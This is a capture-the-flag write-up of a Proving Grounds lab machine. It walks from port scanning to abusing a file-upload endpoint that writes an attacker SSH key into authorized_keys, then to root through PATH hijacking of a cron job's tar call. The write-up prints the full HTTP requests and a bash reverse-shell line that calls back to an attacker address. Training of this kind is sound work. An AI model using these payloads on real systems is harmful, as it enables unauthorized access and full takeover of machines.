---
layout: post
author: H4
---

This is a box by Offensive Security and integrated in the 'proving grounds' play lab.  

# discovery

As usual we start with a port scan to detect the attack surface.

## port scan
```bash
$ nmap -Pn -p21,25022,33414,40080 -sV 192.168.242.249
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-24 22:36 CEST
Stats: 0:01:02 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 75.00% done; ETC: 22:38 (0:00:21 remaining)
Nmap scan report for 192.168.242.249
Host is up (0.027s latency).

PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
25022/tcp open  ssh     OpenSSH 8.6 (protocol 2.0)
33414/tcp open  unknown
40080/tcp open  http    Apache httpd 2.4.53 ((Fedora))
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port33414-TCP:V=7.93%I=7%D=7/24%Time=64BEE0E5%P=aarch64-unknown-linux-g
SF:nu%r(GetRequest,184,"HTTP/1\.1\x20404\x20NOT\x20FOUND\r\nServer:\x20Wer
SF:kzeug/2\.2\.3\x20Python/3\.9\.13\r\nDate:\x20Mon,\x2024\x20Jul\x202023\
SF:x2020:36:53\x20GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nC
SF:ontent-Length:\x20207\r\nConnection:\x20close\r\n\r\n<!doctype\x20html>
SF:\n<html\x20lang=en>\n<title>404\x20Not\x20Found</title>\n<h1>Not\x20Fou
SF:nd</h1>\n<p>The\x20requested\x20URL\x20was\x20not\x20found\x20on\x20the
SF:\x20server\.\x20If\x20you\x20entered\x20the\x20URL\x20manually\x20pleas
SF:e\x20check\x20your\x20spelling\x20and\x20try\x20again\.</p>\n")%r(HTTPO
SF:ptions,184,"HTTP/1\.1\x20404\x20NOT\x20FOUND\r\nServer:\x20Werkzeug/2\.
SF:2\.3\x20Python/3\.9\.13\r\nDate:\x20Mon,\x2024\x20Jul\x202023\x2020:36:
SF:53\x20GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Le
SF:ngth:\x20207\r\nConnection:\x20close\r\n\r\n<!doctype\x20html>\n<html\x
SF:20lang=en>\n<title>404\x20Not\x20Found</title>\n<h1>Not\x20Found</h1>\n
SF:<p>The\x20requested\x20URL\x20was\x20not\x20found\x20on\x20the\x20serve
SF:r\.\x20If\x20you\x20entered\x20the\x20URL\x20manually\x20please\x20chec
SF:k\x20your\x20spelling\x20and\x20try\x20again\.</p>\n")%r(RTSPRequest,1F
SF:4,"<!DOCTYPE\x20HTML\x20PUBLIC\x20\"-//W3C//DTD\x20HTML\x204\.01//EN\"\
SF:n\x20\x20\x20\x20\x20\x20\x20\x20\"http://www\.w3\.org/TR/html4/strict\
SF:.dtd\">\n<html>\n\x20\x20\x20\x20<head>\n\x20\x20\x20\x20\x20\x20\x20\x
SF:20<meta\x20http-equiv=\"Content-Type\"\x20content=\"text/html;charset=u
SF:tf-8\">\n\x20\x20\x20\x20\x20\x20\x20\x20<title>Error\x20response</titl
SF:e>\n\x20\x20\x20\x20</head>\n\x20\x20\x20\x20<body>\n\x20\x20\x20\x20\x
SF:20\x20\x20\x20<h1>Error\x20response</h1>\n\x20\x20\x20\x20\x20\x20\x20\
SF:x20<p>Error\x20code:\x20400</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Mes
SF:sage:\x20Bad\x20request\x20version\x20\('RTSP/1\.0'\)\.</p>\n\x20\x20\x
SF:20\x20\x20\x20\x20\x20<p>Error\x20code\x20explanation:\x20HTTPStatus\.B
SF:AD_REQUEST\x20-\x20Bad\x20request\x20syntax\x20or\x20unsupported\x20met
SF:hod\.</p>\n\x20\x20\x20\x20</body>\n</html>\n")%r(Help,1EF,"<!DOCTYPE\x
SF:20HTML\x20PUBLIC\x20\"-//W3C//DTD\x20HTML\x204\.01//EN\"\n\x20\x20\x20\
SF:x20\x20\x20\x20\x20\"http://www\.w3\.org/TR/html4/strict\.dtd\">\n<html
SF:>\n\x20\x20\x20\x20<head>\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20htt
SF:p-equiv=\"Content-Type\"\x20content=\"text/html;charset=utf-8\">\n\x20\
SF:x20\x20\x20\x20\x20\x20\x20<title>Error\x20response</title>\n\x20\x20\x
SF:20\x20</head>\n\x20\x20\x20\x20<body>\n\x20\x20\x20\x20\x20\x20\x20\x20
SF:<h1>Error\x20response</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x2
SF:0code:\x20400</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Message:\x20Bad\x
SF:20request\x20syntax\x20\('HELP'\)\.</p>\n\x20\x20\x20\x20\x20\x20\x20\x
SF:20<p>Error\x20code\x20explanation:\x20HTTPStatus\.BAD_REQUEST\x20-\x20B
SF:ad\x20request\x20syntax\x20or\x20unsupported\x20method\.</p>\n\x20\x20\
SF:x20\x20</body>\n</html>\n");
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 88.70 seconds
```

## dir busting
```bash
$ gobuster dir -k -u http://192.168.242.249:40080/ -w /usr/share/wordlists/dirb/common.txt -t 5 -x txt,html,php
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.242.249:40080/
[+] Method:                  GET
[+] Threads:                 5
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              html,php,txt
[+] Timeout:                 10s
===============================================================
2023/07/24 22:39:54 Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 199]
/.hta.php             (Status: 403) [Size: 199]
/.hta                 (Status: 403) [Size: 199]
/.htaccess            (Status: 403) [Size: 199]
/.htaccess.txt        (Status: 403) [Size: 199]
/.hta.html            (Status: 403) [Size: 199]
/.hta.txt             (Status: 403) [Size: 199]
/.htaccess.php        (Status: 403) [Size: 199]
/.htaccess.html       (Status: 403) [Size: 199]
/.htpasswd.html       (Status: 403) [Size: 199]
/.htpasswd.php        (Status: 403) [Size: 199]
/.htpasswd.txt        (Status: 403) [Size: 199]
/.htpasswd            (Status: 403) [Size: 199]
/cgi-bin/             (Status: 403) [Size: 199]
/cgi-bin/.html        (Status: 403) [Size: 199]
/images               (Status: 301) [Size: 244] [--> http://192.168.242.249:40080/images/]
/index.html           (Status: 200) [Size: 1092]
/index.html           (Status: 200) [Size: 1092]
/LICENSE              (Status: 200) [Size: 6555]
/styles               (Status: 301) [Size: 244] [--> http://192.168.242.249:40080/styles/]
Progress: 18420 / 18460 (99.78%)
===============================================================
2023/07/24 22:41:35 Finished
===============================================================
```

```bash
$ gobuster dir -k -u http://192.168.242.249:33414/ -w /usr/share/wordlists/dirb/common.txt -t 5 -x txt,html,php
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.242.249:33414/
[+] Method:                  GET
[+] Threads:                 5
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              txt,html,php
[+] Timeout:                 10s
===============================================================
2023/07/24 22:40:38 Starting gobuster in directory enumeration mode
===============================================================
/help                 (Status: 200) [Size: 137]
/info                 (Status: 200) [Size: 98]
Progress: 18441 / 18460 (99.90%)
===============================================================
2023/07/24 22:44:04 Finished
===============================================================
```

> `/help` and `/info` look interesting.
{: .prompt-info }

```http
GET /help HTTP/1.1
Host: 192.168.242.249:33414
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1

HTTP/1.1 200 OK
Server: Werkzeug/2.2.3 Python/3.9.13
Date: Tue, 25 Jul 2023 05:20:18 GMT
Content-Type: application/json
Content-Length: 137
Connection: close

["GET /info : General Info","GET /help : This listing","GET /file-list?dir=/tmp : List of the files","POST /file-upload : Upload files"]
```

> We have a file upload (`/file-upload`) and file listing (`/file-list?dir=/tmp`)
{: .prompt-info }

Lets check the file listing first.
```http
GET /file-list?dir=/tmp HTTP/1.1
Host: 192.168.242.249:33414
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1

HTTP/1.1 200 OK
Server: Werkzeug/2.2.3 Python/3.9.13
Date: Tue, 25 Jul 2023 05:22:30 GMT
Content-Type: application/json
Content-Length: 571
Connection: close

["flask.tar.gz","systemd-private-2e0fe856c0fd44ecadc327be091b8089-httpd.service-Nae0ZJ","systemd-private-2e0fe856c0fd44ecadc327be091b8089-systemd-logind.service-FKAUil","systemd-private-2e0fe856c0fd44ecadc327be091b8089-ModemManager.service-vpkdWb","systemd-private-2e0fe856c0fd44ecadc327be091b8089-chronyd.service-4zOGIi","systemd-private-2e0fe856c0fd44ecadc327be091b8089-dbus-broker.service-DeFCB5","systemd-private-2e0fe856c0fd44ecadc327be091b8089-systemd-resolved.service-pDGRUI","systemd-private-2e0fe856c0fd44ecadc327be091b8089-systemd-oomd.service-dJ9LLo"]
```

> It works
{: .prompt-info }

When looking for juicy folders and stuff we soon see there is a user named `alfredo` with a `.ssh` folder
```http
GET /file-list?dir=/home/alfredo HTTP/1.1
Host: 192.168.242.249:33414
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1

HTTP/1.1 200 OK
Server: Werkzeug/2.2.3 Python/3.9.13
Date: Tue, 25 Jul 2023 05:25:04 GMT
Content-Type: application/json
Content-Length: 96
Connection: close

[".bash_logout",".bash_profile",".bashrc","local.txt",".ssh","restapi",".bash_history"]
```

```http
GET /file-list?dir=/home/alfredo/.ssh HTTP/1.1
Host: 192.168.242.249:33414
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1

HTTP/1.1 200 OK
Server: Werkzeug/2.2.3 Python/3.9.13
Date: Tue, 25 Jul 2023 05:25:36 GMT
Content-Type: application/json
Content-Length: 42
Connection: close

["id_rsa","id_rsa.pub","authorized_keys"]
```

---

# exploitation
Lets try to exploit the `/file-upload` feature to upload a file and override the `authorized_keys` file to gain access via `ssh`.

```http
POST /file-upload HTTP/1.1
Host: 192.168.242.249:33414
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Length: 188
Content-Type: multipart/form-data; boundary=------------------------d2dc41f8d6cbb89e

--------------------------d2dc41f8d6cbb89e
Content-Disposition: form-data; name="file"; filename="1.txt"
Content-Type: text/plain

123

--------------------------d2dc41f8d6cbb89e--

HTTP/1.1 400 BAD REQUEST
Server: Werkzeug/2.2.3 Python/3.9.13
Date: Tue, 25 Jul 2023 05:27:57 GMT
Content-Type: application/json
Content-Length: 46
Connection: close

{"message":"No filename part in the request"}

```

> So we need to add another part with `filename`
{: .prompt-danger }

```http
POST /file-upload HTTP/1.1
Host: 192.168.242.249:33414
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Length: 292
Content-Type: multipart/form-data; boundary=------------------------d2dc41f8d6cbb89e

--------------------------d2dc41f8d6cbb89e
Content-Disposition: form-data; name="file"; filename="1.txt"
Content-Type: text/plain

123
--------------------------d2dc41f8d6cbb89e
Content-Disposition: form-data; name="filename"

1.txt
--------------------------d2dc41f8d6cbb89e--

HTTP/1.1 201 CREATED
Server: Werkzeug/2.2.3 Python/3.9.13
Date: Tue, 25 Jul 2023 05:29:10 GMT
Content-Type: application/json
Content-Length: 41
Connection: close

{"message":"File successfully uploaded"}
```

Lets check if the file got uploaded
```http
GET /file-list?dir=/tmp HTTP/1.1
Host: 192.168.242.249:33414
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1

HTTP/1.1 200 OK
Server: Werkzeug/2.2.3 Python/3.9.13
Date: Tue, 25 Jul 2023 05:29:53 GMT
Content-Type: application/json
Content-Length: 583
Connection: close

["1.txt","flask.tar.gz","systemd-private-2e0fe856c0fd44ecadc327be091b8089-httpd.service-Nae0ZJ","systemd-private-2e0fe856c0fd44ecadc327be091b8089-systemd-logind.service-FKAUil","systemd-private-2e0fe856c0fd44ecadc327be091b8089-ModemManager.service-vpkdWb","systemd-private-2e0fe856c0fd44ecadc327be091b8089-chronyd.service-4zOGIi","systemd-private-2e0fe856c0fd44ecadc327be091b8089-dbus-broker.service-DeFCB5","systemd-private-2e0fe856c0fd44ecadc327be091b8089-systemd-resolved.service-pDGRUI","systemd-private-2e0fe856c0fd44ecadc327be091b8089-systemd-oomd.service-dJ9LLo"]

```

> Yes! It did.
{: .prompt-info }

Now lets check if we can manipulate the folder where the file gets uploaded to.
```http
POST /file-upload HTTP/1.1
Host: 192.168.242.249:33414
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Length: 302
Content-Type: multipart/form-data; boundary=------------------------d2dc41f8d6cbb89e

--------------------------d2dc41f8d6cbb89e
Content-Disposition: form-data; name="file"; filename="1.txt"
Content-Type: text/plain

123
--------------------------d2dc41f8d6cbb89e
Content-Disposition: form-data; name="filename"

/home/alfredo/1.txt
--------------------------d2dc41f8d6cbb89e--

HTTP/1.1 201 CREATED
Server: Werkzeug/2.2.3 Python/3.9.13
Date: Tue, 25 Jul 2023 05:31:42 GMT
Content-Type: application/json
Content-Length: 41
Connection: close

{"message":"File successfully uploaded"}
```

```http
GET /file-list?dir=/home/alfredo HTTP/1.1
Host: 192.168.242.249:33414
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1

HTTP/1.1 200 OK
Server: Werkzeug/2.2.3 Python/3.9.13
Date: Tue, 25 Jul 2023 05:32:18 GMT
Content-Type: application/json
Content-Length: 96
Connection: close

[".bash_logout",".bash_profile",".bashrc","local.txt",".ssh","restapi",".bash_history","1.txt"]
```

> It worked too!
{: .prompt-info }

Lets generate a `ssh` private key and add it to the `authorized_keys` file.  
Generate the key material on the attacker machine
```bash
$ ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/void/.ssh/id_rsa): id_rsa_alfredo
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in id_rsa_alfredo
Your public key has been saved in id_rsa_alfredo.pub
The key fingerprint is:
SHA256:x5sO1YQJPxxoC4/DoT88Khmdm8ZHSd3FFjzbJgrZVLk void@kali
The key's randomart image is:
+---[RSA 3072]----+
|        ...+oo   |
|      o o+.+B    |
|     o B **o.=   |
|    . = *.o+E o  |
|   . = oS.+..o   |
|  . o B  o.o     |
|   + = o. o      |
|  o * .  o       |
|   o .    .      |
+----[SHA256]-----+

$ ls
id_rsa_alfredo  id_rsa_alfredo.pub

$ chmod 600 id_rsa_alfredo.pub

$ cat id_rsa_alfredo.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDXX7jdVXySHeyJkQxdn0vqUzX1tZHkJzxVXdk1WduuZi9KqrNlAgOEUbZEMSyOeJmllFMvkxvA7n0k1cia+S1+4oOXANrKS1turruf+TCiWa39MLy9NpgBphi8IcI6hRdqft1dKlvU8dcGnly1TOM3p+ik/3ByAVY1QW53GdzsBs25fbKDvRGji4XYVRoFS5u9edNn9c5l9u75EhROFpAlm1JPh605kYwou9DB9qcmycoWBytkXMnbVEB3ufoTi3UuiQf2mcDmTMb37aLKJ2SbnRM/IBeeE1uCYpdqkvhUpGI/+O7qxCnbVmJd0bI1QUMX88FpFWajfo5ecLYwXM4YOlsE9ru7BRf/qc6XtuFC9hzutgLiPgPtzK0Ah7GE8jG2hVyrtqT4jd0LCdEmws1tulHSjIUifvQ7dI8v9GTORQMEd+hrGikZkF6K75UPi6aIbo2NoxDIGk0SA3uRbNb3oImxE+dWbB9eUuqk7f7HIWpEBQ9K+RopNAp4EPPGysc= void@kali
```

Upload the public key to the target
```http
POST /file-upload HTTP/1.1
Host: 192.168.242.249:33414
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Length: 878
Content-Type: multipart/form-data; boundary=------------------------d2dc41f8d6cbb89e

--------------------------d2dc41f8d6cbb89e
Content-Disposition: form-data; name="file"; filename="1.txt"
Content-Type: text/plain

ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDXX7jdVXySHeyJkQxdn0vqUzX1tZHkJzxVXdk1WduuZi9KqrNlAgOEUbZEMSyOeJmllFMvkxvA7n0k1cia+S1+4oOXANrKS1turruf+TCiWa39MLy9NpgBphi8IcI6hRdqft1dKlvU8dcGnly1TOM3p+ik/3ByAVY1QW53GdzsBs25fbKDvRGji4XYVRoFS5u9edNn9c5l9u75EhROFpAlm1JPh605kYwou9DB9qcmycoWBytkXMnbVEB3ufoTi3UuiQf2mcDmTMb37aLKJ2SbnRM/IBeeE1uCYpdqkvhUpGI/+O7qxCnbVmJd0bI1QUMX88FpFWajfo5ecLYwXM4YOlsE9ru7BRf/qc6XtuFC9hzutgLiPgPtzK0Ah7GE8jG2hVyrtqT4jd0LCdEmws1tulHSjIUifvQ7dI8v9GTORQMEd+hrGikZkF6K75UPi6aIbo2NoxDIGk0SA3uRbNb3oImxE+dWbB9eUuqk7f7HIWpEBQ9K+RopNAp4EPPGysc= void@kali

--------------------------d2dc41f8d6cbb89e
Content-Disposition: form-data; name="filename"

/home/alfredo/.ssh/authorized_keys
--------------------------d2dc41f8d6cbb89e--

HTTP/1.1 201 CREATED
Server: Werkzeug/2.2.3 Python/3.9.13
Date: Tue, 25 Jul 2023 05:14:32 GMT
Content-Type: application/json
Content-Length: 41
Connection: close

{"message":"File successfully uploaded"}
```

Login via `ssh`
```bash
$ ssh -i id_rsa_alfredo alfredo@192.168.242.249 -p 25022
The authenticity of host '[192.168.242.249]:25022 ([192.168.242.249]:25022)' can't be established.
ED25519 key fingerprint is SHA256:kflJUZqQzlDWxXgGuod+HGsJPk++nvt5ZyveJgx1jgQ.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[192.168.242.249]:25022' (ED25519) to the list of known hosts.
Last login: Tue Mar 28 03:21:25 2023
[alfredo@fedora ~]$ id
uid=1000(alfredo) gid=1000(alfredo) groups=1000(alfredo)
```

> Yes! We got `ssh` access.
{: .prompt-info }

---

# post exploitation
## get first flag
```bash
[alfredo@fedora ~]$ ls
1.txt  local.txt  restapi
[alfredo@fedora ~]$ cat local.txt 
3******************************1
```

## privilege escalation
Running `linpeas` reveals a vulnerable `cronjob`
```bash
[alfredo@fedora tmp]$ sh linpeas.sh 
...
*/1 * * * * root /usr/local/bin/backup-flask.sh
...
```

Checking the content and permissions on the file `backup-flask.sh`
```bash
[alfredo@fedora tmp]$ ls -lsah /usr/local/bin/backup-flask.sh
4.0K -rwxr-xr-x. 1 root root 106 Mar 28 03:18 /usr/local/bin/backup-flask.sh

[alfredo@fedora tmp]$ cat /usr/local/bin/backup-flask.sh
#!/bin/sh
export PATH="/home/alfredo/restapi:$PATH"
cd /home/alfredo/restapi
tar czf /tmp/flask.tar.gz *
```

We are not able to change the content of the file. However if we analyse the file content we see that the `cronjob` at first adds the path `/home/alfredo/restapi` to the environment variable, changes to this directory and in the end executes the command `tar` (without an absolute path) to compress stuff. 

> We can exploit this with binary hijacking. Therefore we create a file named `tar` in the folder `/home/alfredo/restapi` with a test payload, wait a minute and look if it works.
{: .prompt-info }

`/home/alfredo/restapi/tar` content
```bash
#!/bin/bash

whoami > /tmp/t.txt
```

After a minute we check if the file exists
```bash
[alfredo@fedora tmp]$ ls -lsah t.txt 
4.0K -rw-r--r-- 1 root root 5 Jul 25 15:29 t.txt

[alfredo@fedora tmp]$ cat t.txt 
root
```

> Yes the file exists and the escalation works!
{: .prompt-info }

Now lets try to trigger a reverse shell using this technique.  
At first we start by creating a listener on the attacker machine.
```bash
$ nc -lvp 80        
listening on [any] 80 ...
```

Then we change the content of our `tar` file with a reverse shell 
```bash
[alfredo@fedora tmp]$ cat /home/alfredo/restapi/tar 
#!/bin/bash

bash -i >& /dev/tcp/192.168.45.217/80 0>&1
```

> After waiting a few minutes we realise that we do not get a connection. There seems to be some firewall rule in place.
{: .prompt-danger }

After checking some ports outgoing using `netcat` (`nc 192.168.45.217 80`) we see that port `443` is allowed.  
  
Lets change our listener and update our `tar` file
```bash
$ nc -lvp 443       
listening on [any] 443 ...
```

```bash
[alfredo@fedora tmp]$ cat /home/alfredo/restapi/tar 
#!/bin/bash

bash -i >& /dev/tcp/192.168.45.217/443 0>&1
```

After a minute we get a connection.
```bash
$ nc -lvp 443
listening on [any] 443 ...
192.168.177.249: inverse host lookup failed: Unknown host
connect to [192.168.45.217] from (UNKNOWN) [192.168.177.249] 55598
bash: cannot set terminal process group (16966): Inappropriate ioctl for device
bash: no job control in this shell
[root@fedora restapi]# id
id
uid=0(root) gid=0(root) groups=0(root)
```

> Yes we are `root`!
{: .prompt-info }

## get second flag
```bash
[root@fedora ~]# ls
ls
anaconda-ks.cfg
build.sh
proof.txt
run.sh
[root@fedora ~]# cat proof.txt
cat proof.txt
5******************************b
```

Pwned! <@:-)
